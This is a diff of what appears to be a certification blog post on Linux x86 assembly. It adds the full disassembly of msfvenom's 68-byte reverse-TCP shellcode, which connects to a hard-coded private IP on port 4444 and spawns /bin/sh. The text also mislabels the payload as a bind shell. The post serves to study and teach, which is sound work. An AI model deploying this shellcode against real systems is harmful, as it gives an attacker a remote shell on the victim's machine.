@@ -44,6 +44,48 @@ The mechanics of system calls in Linux x86 assembly were explained in an earlier
 
 In the sections following, the assembly code used to prepare for and execute the functions listed above will be explained. As the details of these functions and their purpose within a TCP reverse shell program were previously explained during the analysis of the C code, the following sections will focus on the assembly code used to prepare for and excute each function rather than on the purpose of the function within the program. Some of the assembly used for the TCP reverse shell is similar to the assembly used within the TCP bind shell explained in a previous post. These sections will be explained in less detail, as they have already been explained previously. The assembly code will come first, followed by the explanation of the code.
 
+## MSFVenom Shellcode Under the Microscope
+
+### Referencing MSF Goodies
+
+msfvenom -p linux/x86/shell_reverse_tcp -f raw| ndisasm -u - produces a bind shell payload the size of 68 bytes for us to compare to our generated shellcode:
+
+```nasm
+xor ebx,ebx  
+mul ebx  
+push ebx  
+inc ebx  
+push ebx  
+push byte +0x2 
+mov ecx,esp  
+mov al,0x66 ; socket syscall
+int 0x80 
+xchg eax,ebx  
+pop ecx  
+mov al,0x3f ; dup2
+int 0x80  
+dec ecx  
+jns 0x11  
+push dword 0x80fea8c0 
+push dword 0x5c110002 
+mov ecx,esp  
+mov al,0x66  ; socketcall
+push eax  
+push ecx  
+push ebx  
+mov bl,0x3  
+mov ecx,esp  
+int 0x80  
+push edx  
+push dword 0x68732f6e 
+push dword 0x69622f2f 
+mov ebx,esp  
+push edx  
+push ebx  
+mov ecx,esp  
+mov al,0xb  ; execve
+int 0x80 
+```
 
 _This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:_
 
